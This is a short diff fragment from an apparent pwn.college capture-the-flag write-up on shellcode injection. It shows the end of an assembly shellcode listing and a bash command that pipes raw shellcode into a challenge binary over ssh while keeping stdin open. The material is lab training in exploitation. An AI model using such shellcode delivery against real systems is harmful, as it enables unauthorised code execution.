@@ -312,6 +312,7 @@ _start:
   popq %rdx
   syscall
 ```
+
 In order to keep stdin open and control the outputs, we can use this command:
 ```bash
 (cat 10.raw; sleep 30; cat 1.raw) | ssh cse466@cse466.pwn.college /babyshell_level10_testing1
